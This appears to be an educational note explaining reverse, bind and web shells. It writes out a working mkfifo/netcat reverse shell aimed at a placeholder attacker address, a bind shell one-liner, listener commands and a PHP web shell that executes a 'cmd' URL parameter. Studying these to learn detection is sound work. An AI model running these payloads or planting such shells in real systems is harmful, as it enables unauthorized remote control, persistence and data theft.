## What is a Shell
A shell is just software that lets a user talk to an os, could be graphical but in most security stuff its a command line interface. When people say shell in this context they usually mean the specific session an attacker gets on a system theyve compromised, letting them run commands and execute stuff on it directly

Some of what that access actually lets someone do

- remote system control — run commands or software on the target from anywhere
- privilege escalation — if the shell you land on is limited you start looking for ways to bump yourself up to admin or root
- data exfiltration — once you can run commands you can go dig through the system and pull sensitive data off it
- persistence — creating new users setting credentials or dropping a backdoor so access sticks around even after a reboot or patch
- post exploitation stuff — deploying malware making hidden accounts wiping logs to cover tracks
- pivoting — using that one shell as a stepping stone to reach other machines sitting on the same network

## Reverse Shells
A reverse shell aka connect back shell is probably the most common way people get access during an attack. The connection starts from the compromised machine and goes back out to the attackers machine instead of the other way around, this helps dodge detection since most firewalls are way more focused on blocking incoming stuff than outgoing

To actually catch one you need something listening first, netcat is the classic tool for this

```
nc -lvnp 443
```

-l puts it in listen mode, -v is verbose so you see whats happening, -n skips dns lookups so it only deals in raw ips, -p sets which port to sit on, here its 443. People tend to pick ports that already look normal like 53 80 8080 443 139 or 445 just so the traffic blends in better instead of standing out

Once the listener is sitting there waiting, the actual trigger is some payload run on the target, usually through whatever vuln or access got you there in the first place. A classic pipe based one looks like

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

- rm -f /tmp/f — clears out any leftover pipe file first so theres no conflict
- mkfifo /tmp/f — makes a named pipe which lets data flow both directions between processes
- cat /tmp/f — reads whatever comes through that pipe
- | sh -i 2>&1 — feeds that into an interactive shell, with errors also getting redirected back so you actually see them
- | nc ATTACKER_IP ATTACKER_PORT — sends the shells output over to the listener
- >/tmp/f — routes stuff back into the pipe so the whole loop stays two way

Once this runs the listener catches a full interactive session and you can start typing commands like youre sitting on the box directly

## Bind Shells
Bind shells flip the direction, instead of connecting out the compromised machine opens up a port and just sits there waiting, when you connect to that port you get shell access. Mainly useful when outbound connections are blocked on the target, but its less commonly used since it has to stay actively listening the whole time which makes it easier to notice

Setup on the target side looks basically the same as before just swapping the destination for a local listener

```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```

Same pipe logic, but nc -l 0.0.0.0 8080 puts netcat into listen mode on all interfaces on port 8080 instead of dialing out anywhere. Worth remembering ports under 1024 need root to bind to, picking something like 8080 avoids that hassle entirely

Connecting to it from the other side is just

```
nc -nv TARGET_IP 8080
```

-n skips dns for speed, -v gives verbose output so you know when the connection lands, then just the target ip and port its listening on. Once it connects you land in the shell and can run commands from there

## Other Listener Tools
Netcat isnt the only thing that can catch or work with a shell, a few others worth knowing

Rlwrap is small but genuinely useful, it wraps around a command and adds proper readline support so you get arrow keys and command history instead of a raw dumb terminal

```
rlwrap nc -lvnp 443
```

Ncat is basically netcat but upgraded, comes out of the nmap project and adds stuff like built in ssl. Plain listener

```
ncat -lvnp 4444
```

With ssl thrown in

```
ncat --ssl -lvnp 4444
```

--ssl wraps the session in encryption, itll spin up a temporary rsa key on its own unless you point it at a permanent one

Socat is more of a general purpose tool for wiring two data sources together, in this case two hosts over a socket. Basic listener setup

```
socat -d -d TCP-LISTEN:443 STDOUT
```

-d bumps up verbosity, stacking it twice bumps it up even more. TCP-LISTEN:443 opens a listener socket on 443 and STDOUT just prints whatever comes in straight to the terminal

## Web Shells
A web shell is basically a script sitting on a compromised web server, written in whatever language that server actually understands, and it lets commands get executed through the web server itself. Usually its just a single file with code to run commands or mess with files, and it can be tucked away inside a compromised app making it genuinely hard to spot which is exactly why its such a popular technique. Common languages for these are php asp jsp or even plain cgi scripts

Simple example in php

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Gets saved as something like shell.php and dropped onto the server, usually through some kind of upload vuln file inclusion bug command injection or just outright unauthorized access. Once its sitting there you just hit the url it lives at and pass a cmd parameter through get, like example.com/uploads/shell.php?cmd=whoami which runs whoami and prints the output right into the browser

Some well known public ones worth being aware of

- p0wny-shell — tiny single file php shell, just does remote command execution and nothing fancy
- b374k shell — more built out, adds file management alongside command execution
- c99 shell — one of the more well known ones, comes packed with a ton of built in functionality

## Wrapping It Up
Reverse shells connect from the compromised box back out to you, bind shells sit and wait for you to connect in instead, and web shells give you command execution straight through a vulnerable web app without needing a separate network listener at all. Knowing the differences between all three matters a lot whether youre the one trying to get access or the one trying to spot it happening on a system youre defending